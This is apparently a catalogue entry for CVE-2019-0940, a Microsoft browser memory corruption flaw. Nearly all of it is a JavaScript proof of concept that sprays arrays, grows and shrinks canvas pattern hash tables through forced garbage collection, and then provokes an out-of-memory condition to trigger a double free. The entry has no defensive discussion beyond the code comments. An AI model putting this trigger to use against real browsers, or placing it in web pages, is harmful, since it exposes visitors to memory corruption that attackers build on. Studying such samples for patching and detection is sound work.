# CVE-2019-0940 - Microsoft Browser Memory Corruption Vulnerability

# Links:

# Protocols:
TCP

# Ports:
80

# Sample:

```
<script>
function gc() {
  var res = new Array();
  for(var i = 0; i < 0x1000; i++) {
    var arr = new Array(i);
    for (var j=0; j < arr.length; j++) {
      arr[j] = 0x414141;
    }
    res.push(arr);
  }
}

let canvas = document.createElement('canvas');
let ctx = canvas.getContext('2d');

// Allocate 30 canvas pattern objects so the hash table grows
for (let i = 0; i < 31; i++) {
  ctx.createPattern(canvas, 'no-repeat');
}

// After calling garbage collection objects are getting freed and the hash table
// is shrunk. Objects may get freed by themselves, but it is more reliable to
// call garbage collection explicitly.
gc();

alert(1);

// This causes internal out-of-memory error
canvas.setAttribute('height', 0x4000);
canvas.setAttribute('width', 0x4000);

try {
  // Canvas pattern object is allocated and a double free is triggered
  ctx.createPattern(canvas, 'no-repeat');
} catch (e) {
 // Should fail here
}

</script>
```
